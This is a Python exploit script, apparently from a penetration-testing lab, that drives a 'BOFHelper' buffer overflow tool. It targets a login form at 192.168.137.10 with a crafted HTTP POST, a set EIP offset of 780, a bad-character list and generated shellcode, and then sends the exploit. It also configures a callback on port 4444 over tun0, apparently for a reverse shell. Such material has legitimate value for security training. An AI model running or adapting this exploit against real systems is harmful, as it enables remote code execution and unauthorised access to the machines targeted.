#!/usr/bin/python
import argparse

from BOFHelper import BOFHelper

# TO-DO: 2. Comments; 3. Egg hunter, first stage(is_register); 4. preload & postload

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="The Ultimate Buffer Overflow Helper\n"
                                                 "This semi-automated utility can help you overflow any 32-bit machine"
                                                 "with minimal user interaction. It goes all the way from fuzzing to "
                                                 "exploitation, covering EIP locating, Bad Character discovery, and "
                                                 "space management. It even generates a simple exploitation script for"
                                                 "you once all the information are gathered. Enjoy :)")
    # parser.add_argument("--prefix", help="prefix of payload", type=str, default="")
    # parser.add_argument("--suffix", help="suffix of payload", type=str, default="")
    #parser.add_argument("--ip", help="target's IP address", required=True) # positional
    #parser.add_argument("-p", "--port", help="target's port", required=True)
    #parser.add_argument("--lport", help="reverse shell port", default=4444)
    #parser.add_argument("--iface", help="the interface to use", default="tun0")
    #parser.add_argument("--inc", help="Step increment for fuzzing", default=200)
    #parser.add_argument("-t", "--time", deafult=10.0)
    #parser.add_argument("-v", "--debug", default=False)
    #args = parser.parse_args()

    sbPrefix = ("POST /login HTTP/1.1\r\n"
                "Host: 192.168.137.10\r\n"
                "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Referer: http://192.168.137.10/login\r\n"
                "Connection: close\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: BOFLive.payload_len\r\n\r\n").encode()
    sbSuffix = "&password=A".encode()
    sbPPrefix = "username=".encode()

    bof = BOFHelper('tun0', 4444, "192.168.137.10", 80, sbPrefix, sbPPrefix, sbSuffix, debug=True)
    bof.set_eip_offset(780)
    bof.set_bad_chars(['00', '0a', '0d', '25', '26', '2b', '3d'])
    bof.generate_shellcode()
    bof.set_esp_padding(4)
    bof.expand_space()
    bof.send_exploit()
    # bof.generate_file()
